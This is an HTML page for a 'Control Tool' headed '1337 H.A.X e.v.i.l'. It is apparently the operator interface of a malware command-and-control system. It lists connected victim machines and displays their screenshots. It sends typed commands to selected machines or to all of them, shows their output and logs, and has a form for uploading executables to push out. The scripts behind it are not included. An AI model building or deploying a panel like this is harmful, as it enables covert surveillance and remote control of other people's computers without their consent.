<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>Control Tool</title>
		<link rel="stylesheet" type="text/css" href="ctrl.css"></link>
		<script src="jquery-2.1.3.min.js"></script>
		<script src="ctrl.js"></script>
	</head>
	<body>
		<h1>1337 H.A.X e.v.i.l</h1>
		
		<div id="container_top">
			<button id="refresh" onclick="refresh_users()">Refresh Users</button>
			<br />
			<div id="users_container">
				<table id="users"></table>
				<button id="show_screenshots" onclick="show_screenshots()">Show Screenshots</button>
			</div>
			<div id="screenshots"></div>
		</div>
		<br />
		<br />
		
		<textarea id="cmd"></textarea>
		<button id="run_selected" disabled="disabled" onclick="run_selected()" onkeypress="">Run for...</button>
		<button id="run_all" onclick="run_all()" onkeypress="">Run for ALL</button>
		<br />
		<br />
		
		<div id="left">
			<textarea id="data" readonly="readonly"></textarea>
			<label for="mode_text">
				<input id="mode_text" type="checkbox" onclick="oncheck_text()" />
				Text Mode
			</label>
			<label for="mode_color" style="display:none">
				<input id="mode_color" type="checkbox" onclick="oncheck_color()" />
				Color Mode
			</label>
		</div>
		<div id="right">
			<textarea id="cmds" readonly="readonly"></textarea>
			<label for="mode_linebreaks">
				<input id="mode_linebreaks" type="checkbox" onclick="oncheck_linebreaks()" />
				Line Breaks
			</label>
		</div>
		<br class="clear" />
		<br />
		
		<textarea id="log" readonly="readonly"></textarea>
		<table id="files"></table>
		<form action="ctrl.php" method="post" enctype="multipart/form-data">
			<input type="file" name="file" />
			<input type="hidden" name="req" value="upload_file" />
			<input type="submit" value="Upload Executable" name="submit">
		</form>
	</body>
</html>
